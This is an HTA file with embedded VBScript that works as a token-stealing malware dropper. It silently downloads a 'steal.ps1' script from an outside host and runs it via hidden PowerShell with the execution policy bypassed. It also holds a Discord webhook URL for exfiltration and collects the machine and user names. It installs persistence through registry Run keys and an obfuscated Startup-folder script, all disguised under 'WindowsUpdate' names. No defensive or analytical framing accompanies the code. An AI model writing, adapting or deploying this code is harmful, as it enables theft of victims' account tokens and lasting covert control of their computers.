<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" windowstate="normal"/>
<script language="VBScript">
' --- WHITE SCREEN FLASH (Confirms execution) ---
window.resizeTo 400, 300
window.moveTo 500, 500
SetTimeout "window.close()", 1500 ' Closes after 1.5 seconds

On Error Resume Next

Dim sh, fso, WH, PC, USER
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- YOUR DISCORD WEBHOOK ---
WH = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"

PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

' --- RUN THE POWERSHELL SCRIPT ---
Call GrabTokens
Call Persistence

window.close()

' --- Downloads and executes steal.ps1 from your Railway server ---
Sub GrabTokens()
    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056 ' Ignore SSL errors
    xh.Open "GET", "https://dicerigx.app/steal.ps1", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim pc: pc = xh.responseText
    If Len(pc) < 100 Then Exit Sub
    Set xh = Nothing
    
    Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
    Dim f: Set f = fso.CreateTextFile(psf, True)
    f.Write pc
    f.Close
    Set f = Nothing
    
    ' Execute the PowerShell script bypassing execution policy
    sh.Run "cmd /c powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, False
End Sub

' --- Installs persistence so it runs on reboot ---
Sub Persistence()
    Dim payload : payload = "mshta https://dicerigx.app/"
    On Error Resume Next
    
    ' Registry Run
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
    ' Registry RunOnce
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
    
    ' Startup Folder VBS
    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf : Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
    sf.Close
End Sub
</script>
</head><body></body></html>
